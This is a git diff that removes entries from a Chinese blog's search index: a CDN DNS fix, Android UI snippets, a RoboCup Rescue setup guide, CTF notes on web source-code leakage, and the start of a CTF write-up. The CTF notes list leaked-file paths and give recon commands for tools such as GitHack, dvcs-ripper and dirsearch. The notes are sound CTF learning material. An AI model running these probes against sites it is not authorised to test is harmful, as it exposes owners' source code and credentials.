@@ -1,546 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>阿里云CDN加速域名解析冲突问题</title>
-    <url>/2020/10/11/ALi/</url>
-    <content><![CDATA[<p>自己的个人博客搭建了也有一段时间了，以前部署在Gitee上访问速度还行，后来部署到GitHub后速度是一天不如一天了，于是想看看能不能加速一下，看了看网上的做法，我选择采用CDN加速域名。</p>
-<p>首先，你需要将域名进行备案，备案完成后才能进行后续操作。</p>
-<p>然后我选择的是阿里云的CDN（腾讯云貌似有6个月的免费试用，但是由于我是阿里云的域名，去腾讯云搞又得在那边域名备案，就放弃了）</p>
-<p>前面按照网上的步骤走都没啥问题，但当进行到向域名解析中添加一条CNAME记录时显示与A解析冲突（<strong>A解析是当初绑定域名的时候添加的</strong>），我看了看阿里云提供的Tip，但是我还是不太明白怎么操作，尝试将原来的A解析删除，换成CNAME，换完发现我的博客直接502了。后来联系阿里云客服才将问题解决。</p>
-<p>如果你也出现了同样的问题，首先，你检查一下你将顶级域名添加到CDN时设置的源站IP是不是A解析记录里的那个IP（我犯的错是将源站IP设置成了阿里云服务器的IP），如果不是，改过来，然后删除A解析，添加CNAME解析（CNAME解析的添加根据提示做就行了），然后就大功告成了。</p>
-<hr>
-<p>u1s1,阿里云的客服态度蛮好的，晚上10点多了还为我耐心解答问题，在此致谢！</p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
-      <categories>
-        <category>Hexo</category>
-      </categories>
-      <tags>
-        <tag>CDN 解析冲突</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Android</title>
-    <url>/2021/03/17/Android/</url>
-    <content><![CDATA[<h4 id="1-边框圆角化"><a href="#1-边框圆角化" class="headerlink" title="1.边框圆角化"></a>1.边框圆角化</h4><pre><code class="line-numbers language-java">&lt;?xml version="1.0" encoding="utf-8"?&gt;
-&lt;shape
-    xmlns:android="http://schemas.android.com/apk/res/android"
-    android:shape="rectangle"&gt;
-    &lt;!-- 填充的颜色 --&gt;
-    &lt;solid android:color="#EEB422" /&gt;
-    &lt;!-- android:radius 弧形的半径 --&gt;
-    &lt;!-- 设置按钮的四个角为弧形 --&gt;
-    &lt;corners
-        android:radius="20dip" /&gt;
-    &lt;!--也可单独设置--&gt;
-    &lt;!-- &lt;corners --&gt;
-    &lt;!-- android:topLeftRadius="10dp"--&gt;
-    &lt;!-- android:topRightRadius="10dp"--&gt;
-    &lt;!-- android:bottomRightRadius="10dp"--&gt;
-    &lt;!--  android:bottomLeftRadius="10dp"--&gt;
-    &lt;!--   /&gt;  --&gt;
-    **设置文字padding**
-    &lt;!-- padding：Button里面的文字与Button边界的间隔 --&gt;
-    &lt;padding
-        android:left="5dp"
-        android:top="3dp"
-        android:right="5dp"
-        android:bottom="3dp"
-        /&gt;
-&lt;/shape&gt;
-</code></pre>
-<h4 id="2-背景颜色渐变"><a href="#2-背景颜色渐变" class="headerlink" title="2.背景颜色渐变"></a>2.背景颜色渐变</h4><pre><code class="line-numbers language-java">&lt;?xml version="1.0" encoding="utf-8"?&gt;
-&lt;shape xmlns:android="http://schemas.android.com/apk/res/android"&gt;
-    &lt;!--实现应用背景颜色渐变--&gt;
-    &lt;gradient
-        android:startColor="#FFF8DC"
-        android:endColor="#FFE1FF"
-        android:angle="270"/&gt;
-    &lt;corners
-        android:radius="20dip"
-        android:topLeftRadius="0dp"
-        android:topRightRadius="0dp"/&gt;
-&lt;/shape&gt;
-</code></pre>
-<h4 id="3-Button背景色修改无效"><a href="#3-Button背景色修改无效" class="headerlink" title="3.Button背景色修改无效"></a>3.Button背景色修改无效</h4><p>找到main/res/values/themes.xml文件</p>
-<p>将其中的<code>&lt;style name="Theme.MyRegistration" parent="Theme.MaterialComponents.DayNight.DarkActionBar"&gt;</code></p>
-<p>修改为<code>&lt;style name="Theme.MyRegistration" parent="Theme.MaterialComponents.DayNight.DarkActionBar.Bridge"&gt;</code>即可</p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
-      <categories>
-        <category>技术学习</category>
-      </categories>
-      <tags>
-        <tag>Android UI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ROBOCUP RESCUE 示例代码演示</title>
-    <url>/2022/03/20/Apollo/</url>
-    <content><![CDATA[<p>用于记录给学弟学妹们讲解简单的运行服务器和挂载智能体的知识</p>
-<h3 id="一、VMware的安装"><a href="#一、VMware的安装" class="headerlink" title="一、VMware的安装"></a>一、VMware的安装</h3><p>方法一：去官网下载，然后去网上找相关的许可证</p>
-<p>方法二：<a href="http://mp.weixin.qq.com/s?__biz=MzIyNjU2NzIxNQ==&amp;mid=2247485198&amp;idx=1&amp;sn=fb2461b340e6dd31895d0993ad72e4c4&amp;chksm=e86f324edf18bb58d6f0f7cbd9d30caef8f2b6899a12f9303f9c83cc961f7900058373a1f36e&amp;mpshare=1&amp;scene=23&amp;srcid=0222CQ5598w1CNpqZW61vgzL&amp;sharer_sharetime=1645512785274&amp;sharer_shareid=d91c96e983bc83094af7577cae27fc84#rd">http://mp.weixin.qq.com/s?__biz=MzIyNjU2NzIxNQ==&amp;mid=2247485198&amp;idx=1&amp;sn=fb2461b340e6dd31895d0993ad72e4c4&amp;chksm=e86f324edf18bb58d6f0f7cbd9d30caef8f2b6899a12f9303f9c83cc961f7900058373a1f36e&amp;mpshare=1&amp;scene=23&amp;srcid=0222CQ5598w1CNpqZW61vgzL&amp;sharer_sharetime=1645512785274&amp;sharer_shareid=d91c96e983bc83094af7577cae27fc84#rd</a></p>
-<p>（微信公众号里的资源）</p>
-<h3 id="二、Ubuntu的安装"><a href="#二、Ubuntu的安装" class="headerlink" title="二、Ubuntu的安装"></a>二、Ubuntu的安装</h3><blockquote>
-<p>建议直接使用我发在群里的迅雷链接下，那样会快很多。</p>
-</blockquote>
-<p>下面两个方法只是给出作为参考，不建议使用，如果使用记得看好版本，下载<strong>Ubuntu18.04</strong>.</p>
-<p>方法一：Ubuntu官网：</p>
-<p><a href="https://cn.ubuntu.com/?_ga=2.176887340.845118543.1645454480-1361094071.1630542545">企业开源和Linux | Ubuntu</a>（中文站）</p>
-<img src="/2022/03/20/Apollo/image-20220222144723106.png" alt="image-20220222144723106" style="zoom:33%;">
-
-<blockquote>
-<p>切记选择桌面系统，不要去选服务器版，服务器版没有图形界面</p>
-</blockquote>
-<p>方法二：清华镜像源</p>
-<p><a href="https://mirrors.tuna.tsinghua.edu.cn/#">清华大学开源软件镜像站 | Tsinghua Open Source Mirror</a></p>
-<img src="/2022/03/20/Apollo/image-20220222144944607.png" alt="image-20220222144944607" style="zoom:33%;">
-
-<img src="/2022/03/20/Apollo/image-20220222145131330.png" alt="image-20220222145131330" style="zoom: 33%;">
-
-<h3 id="三、Ubuntu虚拟机的创建"><a href="#三、Ubuntu虚拟机的创建" class="headerlink" title="三、Ubuntu虚拟机的创建"></a>三、Ubuntu虚拟机的创建</h3><p>相关的教程网上有许多，可相互参考着来，找了几篇供大家参考(18.04与20.04的安装过程差不多，也可以作为参考)</p>
-<p><a href="https://www.jb51.net/article/187313.htm">VMware15虚拟机安装Ubuntu18.04的图文教程_VMware_脚本之家 (jb51.net)</a></p>
-<p><a href="https://zhuanlan.zhihu.com/p/355314438">史上最全最新Ubuntu20.04安装教程（图文） - 知乎 (zhihu.com)</a></p>
-<p><a href="https://www.cnblogs.com/ubuntuanzhuang/p/12934044.html">ubuntu20.04安装教程,ubuntu详细安装教程20.04 - ubuntu安装配置教程 - 博客园 (cnblogs.com)</a></p>
-<p><strong>【注意】</strong>:<font color="red">考虑到以后运行服务器时的速度，建议在安装时将内存尽量选大一点，电脑允许的话选择4096MB或者更高吧。磁盘大小的话选择40G或者更大。</font></p>
-<img src="/2022/03/20/Apollo/image-20220318203527795-16512372663262.png" alt="image-20220318203527795" style="zoom: 50%;">
-
-<img src="/2022/03/20/Apollo/image-20220318203601453-16512372663261.png" alt="image-20220318203601453" style="zoom: 50%;">
-
-<p>安装完成后进入Ubuntu（我这里演示用的是Ubuntu２１，所以界面看起来可能不太一样）</p>
-<img src="/2022/03/20/Apollo/image-20220222150520871.png" alt="image-20220222150520871" style="zoom:33%;">
-
-<blockquote>
-<p>为了操作便捷，建议再安装一下vmware tools，可以参考下面那个链接中的方式安装，也可以自己百度一些其他的博客。关于如何知道是否安装成功vmware tools，可以尝试将自己主机中的一个txt文档拖拽进 Ubuntu中（拖进某个文件夹，直接拖到桌面好像不行），如果可以的话说明vmware tools已经安装好了。</p>
-</blockquote>
-<p><a href="https://www.cnblogs.com/VagueCheung/p/13535687.html">VMware虚拟机安装Ubuntu18.04教程（图文） - VagueCheung - 博客园 (cnblogs.com)</a></p>
-<h3 id="四、配置相关环境"><a href="#四、配置相关环境" class="headerlink" title="四、配置相关环境"></a>四、配置相关环境</h3><h4 id="JDK的安装"><a href="#JDK的安装" class="headerlink" title="JDK的安装"></a>JDK的安装</h4><p>桌面右键，选择打开终端，使用命令<code>sudo apt install openjdk-17-jdk</code>安装JDK１７</p>
-<img src="/2022/03/20/Apollo/image-20220318204516525-16512372663263.png" alt="image-20220318204516525" style="zoom: 67%;">
-
-<blockquote>
-<p>如果这里下载的速度很慢，只有十几kb/s，那么建议<strong>换源</strong></p>
-<p>一篇讲的很清楚的换源教程：</p>
-<p><a href="https://blog.csdn.net/wangyijieonline/article/details/105360138">Linux]Ubuntu 20.04换阿里源_wangyijieonline的博客-CSDN博客_ubuntu 阿里源</a></p>
-</blockquote>
-<p>在安装完成后再次输入 <code>java -version</code> 和 <code>javac -version</code>，出现相应的版本号即安装成功</p>
-<img src="/2022/03/20/Apollo/image-20220318204617743-16512372663264.png" alt="image-20220318204617743" style="zoom:67%;">
-
-<h4 id="Git与Gradle的安装："><a href="#Git与Gradle的安装：" class="headerlink" title="Git与Gradle的安装："></a>Git与Gradle的安装：</h4><p>在终端输入 <code>gradle -version</code>尝试查看gradle版本，未安装的情况下会提示命令找不到，然后会提示你相关的安装命令（类似这种 <code>sudo apt-get install gradle</code> ），复制下来回车安装即可（因为我在演示前已经安装了，此处直接显示的就是gradle版本号了，你们按照提示安装即可）。</p>
-<p>git的安装与gradle类似，都是先尝试查看版本号，然后根据提示安装。</p>
-<img src="/2022/03/20/Apollo/image-20220318212528084-16512372663265.png" alt="image-20220318212528084" style="zoom: 67%;">
-
-<h3 id="五、服务器的运行"><a href="#五、服务器的运行" class="headerlink" title="五、服务器的运行"></a>五、服务器的运行</h3><h4 id="1-下载压缩包"><a href="#1-下载压缩包" class="headerlink" title="1.下载压缩包"></a>1.下载压缩包</h4><p>在Home目录下（或者其他位置）新建一个文件夹Apollo，然后将服务器和示例代码压缩包复制进来，压缩包没有的可以去下面这个链接自取</p>
-<p>链接：<a href="https://pan.baidu.com/s/1t3EGlevX4M1cCRkLurDDRA">https://pan.baidu.com/s/1t3EGlevX4M1cCRkLurDDRA</a><br>提取码：rcrs</p>
-<img src="/2022/03/20/Apollo/image-20220318205716154-16512372663266.png" alt="image-20220318205716154" style="zoom:67%;">
-
-<p>可以先下载到windows主机，然后将整个压缩包复制到虚拟机中。</p>
-<p>然后右键“提取到此处”进行解压缩</p>
-<img src="/2022/03/20/Apollo/image-20220318210150116-16512372663267.png" alt="image-20220318210150116" style="zoom:67%;">
-
-<p>继续将里面的两个压缩包解压缩，得到如下两个文件夹。</p>
-<img src="/2022/03/20/Apollo/image-20220318210259946-16512372663268.png" alt="image-20220318210259946" style="zoom:67%;">
-
-<h4 id="2-服务器的运行"><a href="#2-服务器的运行" class="headerlink" title="2.服务器的运行"></a>2.服务器的运行</h4><p>首先进入rcrs-server-master文件夹，右键打开终端，输入指令进行编译：</p>
-<pre><code>./gradlew completeBuild
-</code></pre>
-<img src="/2022/03/20/Apollo/image-20220318210442941-16512372663279.png" alt="image-20220318210442941" style="zoom: 50%;">
-
-<p>编译成功后终端会显示 BUILD SUCESSFULLY</p>
-<img src="/2022/03/20/Apollo/image-20220318210624211-165123726632710.png" alt="image-20220318210624211" style="zoom:50%;">
-
-<p>接着输入以下指令来进入scripts文件夹：(cd是进入某个文件夹的命令，可以自己去了解了解<strong>Linux常用命令</strong>)</p>
-<pre><code>cd scripts
-</code></pre>
-<p>然后使用以下指令启动服务器：</p>
-<pre><code>bash start.sh -m ../maps/test/map -c ../maps/test/config
-</code></pre>
-<blockquote>
-<p>start.sh是一个用来启动的脚本，bash是执行这个脚本的命令</p>
-<p><strong>-m</strong> 用来指定地图  ..是指的父目录（上一级目录，即rcrs-server-master文件夹，因为前面用 cd scripts命令进入了该目录下的scripts文件夹） ../maps/test/map 指的就是上一级目录中的maps、test/map,大家可以自己在文件夹里点进去看看，确实存在的</p>
-<p><strong>-c</strong> 用来指定地图配置文件 ../maps/test/config 大家也可以自己去找一下看看，也确实存在</p>
-</blockquote>
-<img src="/2022/03/20/Apollo/image-20220318210755610-165123726632711.png" alt="image-20220318210755610" style="zoom:50%;">
-
-<p>命令执行后等待一会儿服务器就会成功启动，如下图所示：</p>
-<img src="/2022/03/20/Apollo/image-20220318210936867-165123726632712.png" alt="image-20220318210936867" style="zoom:50%;">
-
-
-
-<h4 id="3-智能体的挂载"><a href="#3-智能体的挂载" class="headerlink" title="3.智能体的挂载"></a>3.智能体的挂载</h4><p>服务器启动成功后就要把相关的智能体挂载上去，可以理解为把我们写好的代码连接上服务器，让它能够去控制智能体的行动。</p>
-<p>首先不要关闭之前的终端，也不要关闭服务器。Ctrl+D回到桌面，进入之前解压缩好的adf-sample-agent-java文件夹，然后右键进入终端，输入以下命令：</p>
-<pre><code>./gradlew clean
-</code></pre>
-<pre><code>./gradlew build
-</code></pre>
-<p>然后就会对代码进行编译，编译成功后的界面如下图所示：</p>
-<img src="/2022/03/20/Apollo/image-20220318211123118-165123726632714.png" alt="image-20220318211123118" style="zoom:50%;">
-
-<p>然后使用以下命令挂载智能体：</p>
-<pre><code>bash launch.sh -all
-</code></pre>
-<img src="/2022/03/20/Apollo/image-20220318211226261-165123726632713.png" alt="image-20220318211226261" style="zoom: 67%;">
-
-<p>终端会显示成功挂载的智能体数量，如下图所示则为挂载成功：</p>
-<img src="/2022/03/20/Apollo/image-20220318211409355-165123726632717.png" alt="image-20220318211409355" style="zoom: 67%;">
-
-<p>进度条会一直卡在75%，这时去之前开启的服务器，可以直接点击左侧的图标，进到服务器后直接点Run，然后就能开始跑图。</p>
-<img src="/2022/03/20/Apollo/image-20220318211530508-165123726632716.png" alt="image-20220318211530508" style="zoom: 50%;">
-
-<p>如下图所示，Time指的是回合数，Score指的是分数。</p>
-<img src="/2022/03/20/Apollo/image-20220318211704356-165123726632715.png" alt="image-20220318211704356" style="zoom: 67%;">
-
-<p>运行后的两个终端状况如下图所示</p>
-<img src="/2022/03/20/Apollo/image-20220318211754595-165123726632718.png" alt="image-20220318211754595" style="zoom:50%;">
-
-<p>等到图跑结束后进到服务器那个终端，按<code>Ctrl+C</code>结束运行，并执行 <code>bash kill.sh</code> 彻底杀死进程。</p>
-<img src="/2022/03/20/Apollo/image-20220318211856078-165123726632719.png" alt="image-20220318211856078" style="zoom:67%;">
-
-<p>然后在adf-sample-agent-java文件夹中用Ctrl+C结束智能体的挂载，结束后的两个终端如下图所示：</p>
-<img src="/2022/03/20/Apollo/image-20220318211925792-165123726632720.png" alt="image-20220318211925792" style="zoom:67%;">
-
-<p>到此结束！</p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
-      <categories>
-        <category>技术学习</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTFShow刷题小结(信息搜集)</title>
-    <url>/2020/10/15/CTFShow%E5%88%B7%E9%A2%98%E5%B0%8F%E7%BB%93(%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86)/</url>
-    <content><![CDATA[<p>划了好久的水了，恰巧最近空余时间还算多，就开始刷CTFshow 上的web入门</p>
-<span id="more"></span>
-
-<h3 id="web源码泄露"><a href="#web源码泄露" class="headerlink" title="web源码泄露"></a>web源码泄露</h3><p>印象比较深的是源码泄露的几道题，之前偶尔碰到过，今天才知道是源码泄露。</p>
-<p>搬运自：<a href="https://blog.csdn.net/Fly_hps/article/details/82821857?utm_source=blogxgwz7">https://blog.csdn.net/Fly_hps/article/details/82821857?utm_source=blogxgwz7</a></p>
-<h4 id="vim临时文件"><a href="#vim临时文件" class="headerlink" title="vim临时文件"></a>vim临时文件</h4><p> 程序员使用vim编辑器编写一个<code>index.php</code>文件时，会有一个<code>.index.php.swp</code>文件，如果文件正常退出，则该文件被删除，如果异常退出，该文件则会保存下来，该文件可以用来恢复异常退出的index.php，同时多次意外退出并不会覆盖旧的<code>.swp</code>文件，而是会生成一个新的，例如<code>.swo</code>文件。</p>
-<h4 id="恢复文件"><a href="#恢复文件" class="headerlink" title="恢复文件"></a>恢复文件</h4><blockquote>
-<p>vim -r 恢复的文件名<br>前提是.index.php.swp存在于该目录下</p>
-</blockquote>
-<h4 id="vim备份文件"><a href="#vim备份文件" class="headerlink" title="vim备份文件"></a>vim备份文件</h4><p>默认情况下使用Vim编程，在修改文件后系统会自动生成一个带<code>~</code>的备份文件，某些情况下可以对其下载进行查看；</p>
-<blockquote>
-<p>以 index.php 为例 第一次产生的缓存文件名为 .index.php.swp<br>第二次意外退出后，文件名为.index.php.swo<br>第三次产生的缓存文件则为 .index.php.swn<br>注意：index前有 “ . “</p>
-</blockquote>
-<p><strong>漏洞利用</strong>：直接访问.swp文件，下载回来后删掉末尾的.swp，获得源码文件。</p>
-<h4 id="PHPSTORM"><a href="#PHPSTORM" class="headerlink" title="PHPSTORM"></a>PHPSTORM</h4><p>使用phpstorm新建项目时，会生成一个<code>.idea</code>文件夹，这个文件夹有一个<code>workspace.xml</code>，访问可以得到一些信息。</p>
-<h4 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h4><p>在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p>
-<p><strong>漏洞成因及危害</strong></p>
-<p>该漏洞的成因主要有以下两种：</p>
-<blockquote>
-<p>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。<br>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</p>
-</blockquote>
-<p><strong>漏洞检测</strong></p>
-<p>该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。</p>
-<p><strong>常见备份压缩文件</strong></p>
-<blockquote>
-<p>.rar<br>.zip<br>.7z<br>.tar.gz<br>.bak<br>.swp<br>.txt<br>.html</p>
-</blockquote>
-<p><strong>常见备份文件后缀：</strong></p>
-<pre><code>.index.php.swp
-index.php.swp
-index.php.bak
-.index.php~
-index.php.bak_Edietplus
-index.php.~
-index.php.~1~
-index.php
-index.php~
-index.php.rar
-index.php.zip
-index.php.7z
-index.php.tar.gz
-www.zip
-www.rar
-www.zip
-www.7z
-www.tar.gz
-www.tar
-web.zip
-web.rar
-web.zip
-web.7z
-web.tar.gz
-web.tar
-wwwroot.rar
-web.rar
-</code></pre>
-<p><strong>漏洞利用</strong>：使用disearch扫描</p>
-<blockquote>
-<p>python dirsearch.py -u url -e *</p>
-</blockquote>
-<h4 id="git源码泄漏"><a href="#git源码泄漏" class="headerlink" title="git源码泄漏"></a>git源码泄漏</h4><p>git在初始化项目的时候, 会在项目的根目录(可用<code>git rev-parse --show-toplevel</code>查看)创建一个名为<code>.git</code>的隐藏文件夹, 里面包含了本地所有commit的历史记录. 如果无意间将这个目录置于WEB的路径下让用户可以访问,那么这也就泄露了几乎所有的源代码和其他其他敏感信息.</p>
-<p>该文件可以来恢复源代码</p>
-<p><strong>fuzz：</strong></p>
-<pre><code>http://url/.git/config
-</code></pre>
-<p>若存在该页面，可以看到配置信息，说明存在该漏洞</p>
-<p><strong>漏洞利用：</strong></p>
-<p>工具：<a href="https://github.com/lijiejie/GitHack">GitHack</a></p>
-<pre><code>python GitHack.py http://url/.git/
-</code></pre>
-<blockquote>
-<p>git log可以查看提交历史<br>git diff查看git提交的不同处<br>stash命令可用于临时保存和恢复修改，可跨分支<br>git stash list查看所有保存的记录列表<br>git stash pop，从 git 栈中弹出来一个文件</p>
-</blockquote>
-<p>工具：<a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p>
-<pre><code>rip-hg.pl -v -u http://url/.git
-</code></pre>
-<h4 id="hg泄露"><a href="#hg泄露" class="headerlink" title="hg泄露"></a>hg泄露</h4><p>与git类似, hg在初始化项目时, 会在项目的根目录下创建一个名为<code>.hg</code>的隐藏文件夹,里面包含了代码和分支的修改记录和开发人员的相关信息. 当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p>
-<pre><code>http://www.example.com/.hg/
-</code></pre>
-<p><strong>fuzz：</strong></p>
-<pre><code>http://url/.hg/
-</code></pre>
-<p><strong>漏洞利用：</strong></p>
-<p>工具：<a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p>
-<pre><code>rip-hg.pl -v -u http://url/.hg
-</code></pre>
-<h4 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h4><p>svn同样在项目根目录下会创建一个名为<code>.svn</code>的<strong>隐藏文件夹</strong>, 包含了所有分支commit信息和代码记录.</p>
-<h4 id="fuzz："><a href="#fuzz：" class="headerlink" title="fuzz："></a>fuzz：</h4><pre><code>http://url/.svn/entries
-</code></pre>
-<p><strong>漏洞利用：</strong></p>
-<p>工具：<a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p>
-<pre><code>rip-svn.pl -v -u http://www.example.com/.svn/
-</code></pre>
-<h4 id="bzr-Bazaar泄露"><a href="#bzr-Bazaar泄露" class="headerlink" title="bzr/Bazaar泄露"></a>bzr/Bazaar泄露</h4><p>bzr在初始化项目时(bzr init/init-repo), 会在项目根目录产生名为<code>.bzr</code>的<strong>隐藏目录</strong>, 同样暴露了源代码和用户信息.</p>
-<p><strong>漏洞利用：</strong></p>
-<p>工具：<a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p>
-<pre><code>rip-bzr.pl -v -u http://www.example.com/.bzr/
-</code></pre>
-<h4 id="CVS泄漏"><a href="#CVS泄漏" class="headerlink" title="CVS泄漏"></a><strong>CVS泄漏</strong></h4><p>cvs项目在初始化(cvs checkout <code>project</code>)的时候, 会在<code>project</code>目录下创建一个名为<code>CVS</code>的目录,<br>其中保存了各个文件的修改和commit记录. 通过此目录可以获取代码的历史版本. 其中两个关键文件为:<br><code>CVS/Root</code>和<code>CVS/Entries</code>, 分别记录了项目的根信息和所有文件的结构</p>
-<p><strong>fuzz</strong></p>
-<pre><code>http://url/CVS/Root 返回根信息
-http://url/CVS/Entries 返回所有文件的结构
-</code></pre>
-<p><strong>漏洞利用</strong></p>
-<p>取回源码的命令，这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。</p>
-<pre><code>bk clone http://url/name dir
-</code></pre>
-<p>查看所有的改变的命令，转到download的目录</p>
-<pre><code>bk changes
-</code></pre>
-<h4 id="DS-Store文件泄漏"><a href="#DS-Store文件泄漏" class="headerlink" title=".DS_Store文件泄漏"></a>.DS_Store文件泄漏</h4><p>.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。如果开发/设计人员在发布代码时未删除文件夹中隐藏的.DS_store，则有可能会造成文件泄露</p>
-<p><strong>fuzz：</strong></p>
-<pre><code>http://url/.DS_Store
-</code></pre>
-<p><strong>漏洞利用：</strong></p>
-<p>工具：<a href="https://github.com/lijiejie/ds_store_exp">dsstoreexp</a></p>
-<pre><code>python ds_store_exp.py http://url/.DS_Store
-</code></pre>
-<h4 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h4><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
-<p>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p>
-<p>WEB-INF主要包含一下文件或目录：</p>
-<ul>
-<li><code>/WEB-INF/web.xml</code>：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li>
-<li><code>/WEB-INF/classes/</code>：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</li>
-<li><code>/WEB-INF/lib/</code>：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</li>
-<li><code>/WEB-INF/src/</code>：源码目录，按照包名结构放置各个java文件。</li>
-<li><code>/WEB-INF/database.properties</code>：数据库配置文件漏洞检测以及利用方法</li>
-</ul>
-<h4 id="漏洞检测以及利用方法"><a href="#漏洞检测以及利用方法" class="headerlink" title="漏洞检测以及利用方法"></a>漏洞检测以及利用方法</h4><p>通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p>
-<pre><code>http://url/WEB-INF/web.xml
-</code></pre>
-<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><p><a href="https://0clickjacking0.github.io/2019/04/17/web%E5%B8%B8%E8%A7%81%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/">https://0clickjacking0.github.io/2019/04/17/web常见源码泄露/</a><br><a href="https://www.secpulse.com/archives/55286.html">https://www.secpulse.com/archives/55286.html</a><br><a href="https://www.cnblogs.com/pannengzhi/p/2017-09-23-web-file-disclosure.html">WEB中的敏感文件泄漏</a></p>
-<h3 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h3><p>web18中新接触到了一种新的编码，unicode，其特征为：\uxxxx</p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DASCTF 《Ezfileinclude》 wp</title>
-    <url>/2020/07/25/DASCTF/</url>
-    <content><![CDATA[<p>今天第一次参加CTF比赛，对于我这个菜鸡来说，简直毫无比赛体验<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8">😢</span><span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8">😢</span>，遭受了五个小时的吊打。</p>
-<p><img src="/2020/07/25/DASCTF/image-20200725170156404.png" alt="image-20200725170156404"></p>
-<p>没错，就是这么残忍。直接把我0封了。<img src="/2020/07/25/DASCTF/image-20200725180746269.png" alt="image-20200725180746269"></p>
-<img src="/2020/07/25/DASCTF/image-20200725180804349.png" alt="image-20200725180804349" style="zoom:67%;">
-
-<p>后来在大佬的反复提示帮助之下，勉强解出第一题《Ezfileinclude》,下面记录一下自己的挨打历程。</p>
-<p>打开靶机，页面显示的是一张图片<img src="/2020/07/25/DASCTF/image-20200725180822011.png" alt="image-20200725180822011" style="zoom:67%;"></p>
-<p>查看源码，没太多有用的信息，唯一比较特殊的话是这找图片的url:<code>**image.php?t=1595643210&amp;f=Z3F5LmpwZw==**</code></p>
